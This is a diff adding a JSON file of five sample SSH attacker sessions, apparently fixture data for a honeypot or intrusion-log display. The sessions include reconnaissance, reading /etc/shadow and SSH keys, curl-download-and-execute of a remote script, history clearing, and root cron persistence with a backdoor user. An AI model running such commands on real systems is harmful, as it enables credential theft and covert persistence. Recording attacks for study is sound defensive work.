@@ -1,0 +1,67 @@
+[
+  {
+    "name": "Reconnaissance & Host Discovery",
+    "ip": "185.220.101.5",
+    "country": "Netherlands",
+    "protocol": "ssh",
+    "commands": [
+      "whoami",
+      "id",
+      "uname -a",
+      "cat /etc/passwd",
+      "cat /etc/os-release",
+      "netstat -tulnp",
+      "ps aux",
+      "w"
+    ]
+  },
+  {
+    "name": "Suspicious Script Ingestion",
+    "ip": "198.51.100.42",
+    "country": "United States",
+    "protocol": "ssh",
+    "commands": [
+      "cd /tmp",
+      "curl -O http://198.51.100.42/setup_worker.sh",
+      "chmod 755 setup_worker.sh",
+      "./setup_worker.sh --daemon",
+      "history -c"
+    ]
+  },
+  {
+    "name": "Credential Discovery",
+    "ip": "103.251.167.22",
+    "country": "India",
+    "protocol": "ssh",
+    "commands": [
+      "cat ~/.bash_history",
+      "cat /etc/shadow",
+      "find / -name '*id_rsa*' 2>/dev/null",
+      "cat /root/.ssh/authorized_keys"
+    ]
+  },
+  {
+    "name": "Cron Persistence Attempt",
+    "ip": "194.26.29.112",
+    "country": "Russia",
+    "protocol": "ssh",
+    "commands": [
+      "id",
+      "crontab -l",
+      "echo '*/15 * * * * /tmp/sync_agent.sh' >> /var/spool/cron/crontabs/root",
+      "useradd -m -s /bin/bash sys_backup"
+    ]
+  },
+  {
+    "name": "Privilege Discovery Probe",
+    "ip": "91.240.118.170",
+    "country": "Germany",
+    "protocol": "ssh",
+    "commands": [
+      "sudo -l",
+      "find / -perm -u=s -type f 2>/dev/null",
+      "cat /etc/sudoers",
+      "uname -r"
+    ]
+  }
+]
